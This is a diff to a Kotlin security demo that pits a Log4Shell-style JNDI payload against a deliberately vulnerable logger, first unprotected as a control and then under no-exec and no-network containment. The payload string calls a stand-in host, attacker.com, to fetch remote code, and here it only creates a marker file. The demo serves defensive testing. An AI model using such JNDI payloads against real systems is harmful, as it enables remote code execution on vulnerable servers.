@@ -56,13 +56,13 @@ internal fun runUnsafe(): ScenarioResult = DemoFixture.create("unsafe").use { fi
 }
 
 internal fun runSafe(): ScenarioResult = DemoFixture.create("safe").use { fixture ->
-    println("\u001b[32;1m[STATUS] BEHAVIORAL PROTECTION: ACTIVE\u001b[0m")
-    println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
     val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
-    val observed = observeScenario("protected exploit", ExpectedResult.DENIED) {
-        SafeRunner.run(payload)
-        "attack returned"
-    }
+    // Standalone safe mode must prove this exact operation before its permanent process baseline.
+    UnsafeRunner.run(payload)
+    check(fixture.marker.exists()) { "unrestricted process control did not create its marker" }
+    check(fixture.marker.delete()) { "could not remove the unrestricted control marker" }
+    println("CONTROL: the same payload creates its marker before containment")
+    val observed = SafeRunner.observeRefusal("protected exploit", ControlledOperation.PROCESS_LAUNCH) { VulnerableLogger.log(payload) }
     if (fixture.marker.exists()) observed.copy(outcome = ScenarioOutcome.Completed("attack created its marker")) else observed
 }
 
@@ -101,12 +101,10 @@ internal fun runNoNetwork(): ScenarioResult {
         listener.soTimeout = 2_000
         // Establish that the exact destination is reachable before applying NO_NETWORK.
         java.net.Socket(loopback, listener.localPort).use { listener.accept().close() }
-        observeScenario("NO_NETWORK loopback control", ExpectedResult.DENIED) {
-            SafeRunner.runContained {
-                java.net.Socket().use { socket ->
-                    socket.connect(java.net.InetSocketAddress(loopback, listener.localPort), 2_000)
-                }
-                "network connection escaped"
+        println("CONTROL: the exact loopback destination is reachable before worker containment")
+        SafeRunner.observeRefusal("NO_NETWORK loopback control", ControlledOperation.NETWORK_CONNECT) {
+            java.net.Socket().use { socket ->
+                socket.connect(java.net.InetSocketAddress(loopback, listener.localPort), 2_000)
             }
             "network connection escaped"
         }
@@ -120,7 +118,7 @@ private fun printHelp() {
 
         Modes:
           unsafe   Run the exploit without protection; attack success is expected.
-          safe     Run it with NO_EXEC + NO_NETWORK; kernel denial is expected.
+          safe     Verify controlled process/network permission refusals with NO_EXEC + NO_NETWORK.
           profile  Profile, enforce, and run positive and negative controls.
                    The native file probe is synchronous; io_uring is not exercised.
           all      Run unsafe + safe controls (default); profiling is explicit.
